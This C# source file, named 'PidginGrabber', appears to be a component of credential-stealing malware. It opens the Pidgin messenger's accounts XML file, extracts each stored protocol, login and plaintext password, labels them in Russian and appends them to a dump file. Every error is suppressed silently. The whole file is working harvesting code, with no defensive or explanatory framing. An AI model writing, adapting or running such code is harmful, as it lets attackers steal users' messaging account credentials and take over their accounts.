namespace PidginGrabber
{
    using System.IO;
    using System.Text;
    using System.Xml;

    public class Go
    {
        private static StringBuilder SBTwo = new StringBuilder();

        public static void GetDataPidgin(string PathPn, string SaveFile)
        {
            try
            {
                if (File.Exists(PathPn))
                {
                    try
                    {
                        var xs = new XmlDocument();
                        xs.Load(new XmlTextReader(PathPn));
                        foreach (XmlNode nl in xs.DocumentElement.ChildNodes)
                        {
                            var Protocol = nl.ChildNodes[0].InnerText;
                            var Login = nl.ChildNodes[1].InnerText;
                            var Password = nl.ChildNodes[2].InnerText;
                            if (!string.IsNullOrEmpty(Protocol) && !string.IsNullOrEmpty(Login) && !string.IsNullOrEmpty(Password))
                            {
                                SBTwo.AppendLine($"Используемый протокол: {Protocol}");
                                SBTwo.AppendLine($"Логин пользователя: {Login}");
                                SBTwo.AppendLine($"Пароль пользователя: {Password}\r\n");
                            }
                            else
                            {
                                break;
                            }
                        }
                        if (SBTwo.Length > 0)
                        {
                            try
                            {
                               File.AppendAllText(SaveFile, SBTwo.ToString());
                            }
                            catch { }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }
    }
}